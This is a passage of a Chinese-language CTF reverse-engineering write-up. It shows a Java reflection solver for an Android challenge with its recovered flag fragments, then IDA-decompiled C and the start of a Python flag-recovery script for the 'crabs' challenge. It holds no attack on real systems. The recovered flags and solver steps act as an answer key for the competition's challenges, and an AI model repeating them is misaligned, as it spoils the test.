punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>                <span class="token class-name">Method</span> method <span class="token operator">=</span> <span class="token class-name">SecondCheck</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"check"</span> <span class="token operator">+</span> j<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>                method<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">callCheck</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>                    <span class="token class-name">String</span> str1 <span class="token operator">=</span> <span class="token string">"flag"</span> <span class="token operator">+</span> j<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>                    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> clazz <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>                    <span class="token class-name">Method</span> method2 <span class="token operator">=</span> <span class="token class-name">SecondCheck</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> clazz<span class="token punctuation">,</span> clazz <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>                    method2<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>                    flag1<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token function">callFlag</span><span class="token punctuation">(</span>method2<span class="token punctuation">,</span> <span class="token constant">ENC2</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> flag2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">byte</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                <span class="token class-name">Method</span> method <span class="token operator">=</span> <span class="token class-name">ThirdCheck</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"flag"</span> <span class="token operator">+</span> j<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>                method<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">callFlag</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>                    flag2<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>flag2<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">callFlag</span><span class="token punctuation">(</span><span class="token class-name">Method</span> paramMethod<span class="token punctuation">,</span> <span class="token keyword">int</span> paramInt<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token class-name">Object</span> object <span class="token operator">=</span> paramMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ThirdCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>paramInt<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        <span class="token keyword">return</span> <span class="token punctuation">(</span>object <span class="token keyword">instanceof</span> <span class="token class-name">Boolean</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Boolean</span><span class="token punctuation">)</span>object<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">booleanValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">callFlag</span><span class="token punctuation">(</span><span class="token class-name">Method</span> paramMethod<span class="token punctuation">,</span> <span class="token keyword">int</span> paramInt1<span class="token punctuation">,</span> <span class="token keyword">int</span> paramInt2<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token class-name">Object</span> object <span class="token operator">=</span> paramMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SecondCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>paramInt1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>paramInt2<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token keyword">return</span> <span class="token punctuation">(</span>object <span class="token keyword">instanceof</span> <span class="token class-name">Integer</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">)</span>object<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">callCheck</span><span class="token punctuation">(</span><span class="token class-name">Method</span> paramMethod<span class="token punctuation">,</span> <span class="token keyword">int</span> paramInt<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        <span class="token class-name">Object</span> object <span class="token operator">=</span> paramMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SecondCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>paramInt<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>        <span class="token keyword">return</span> <span class="token punctuation">(</span>object <span class="token keyword">instanceof</span> <span class="token class-name">Boolean</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Boolean</span><span class="token punctuation">)</span>object<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">booleanValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>命令：</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>javac Hack.java </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">java</span> Hack</pre></td></tr></table></figure><p>可以直接得到后面两关的 flag 片段:</p><pre><code>Smkhwxi8wnGu14Jq
I_like_Android_Reverse!!
</code></pre><h2 id="crabs"><a class="anchor" href="#crabs">#</a> crabs</h2><p>使用 IDA 进行逆向</p><p>反编译 main 函数：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter your flag, and get a picture"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_1209</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v8<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Here is your picture"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token function">sub_1483</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>qword_8390<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_2B4D</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>qword_8390<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v8<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v7<span class="token punctuation">,</span> v8<span class="token punctuation">,</span> v9<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"nonono, ugly picute"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">else</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"okokok, nice picture"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag is W4terCTF&#123;%s&#125;\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr></table></figure><h3 id="sub_1209"><a class="anchor" href="#sub_1209">#</a> sub_1209</h3><p><code>sub_1209</code> 的代码</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">55</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    qword_8360 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    qword_8368 <span class="token operator">=</span> v2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    qword_8370 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    qword_8378 <span class="token operator">=</span> v3<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    dword_8380 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    byte_8384 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">36</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>i <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>qword_8360 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> byte_6020<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>LABEL_19<span class="token operator">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"nonono, invalid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    v4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    qword_8390 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    qword_8398 <span class="token operator">=</span> v4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    byte_83A0 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">54</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>      <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>qword_8390 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> j <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>qword_8390 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> j <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">90</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>          <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>qword_8390 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> j <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">96</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>qword_8390 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> j <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">122</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>          <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>qword_8390 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> j <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">47</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>qword_8390 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> j <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">57</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>          <span class="token operator">||</span> j <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> k <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>qword_8390 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> j <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">95</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>          <span class="token keyword">goto</span> LABEL_19<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>  <span class="token keyword">else</span></pre></td></tr><tr><td data-num="40"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"nonono, length wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>a1 即为输入的 flag，首先在 11 行对 flag 前 37 列进行异或处理，与 <code>byte_6020</code> 进行比对</p><p><code>byte_6020</code> 的内容如下</p><p><img data-src="https://s2.loli.net/2024/04/29/KdN6J9DZQ8PjMgk.png" alt="byte_6020"></p><p>用下面的脚本，可以推测 flag 前 37 个字符</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'Q'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">'Y'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">']'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'~'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'39'</span><span class="token punctuation">,</span> <span class="token string">'J'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'^'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token string">'Q'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token string">'~'</span><span class="token punctuation">,</span> <span class="token string">'22'</span><span class="token punctuation">,</span> <span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token string">'@'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre>b<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">for</span> x <span class="token keyword">in</span> a<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>x<span 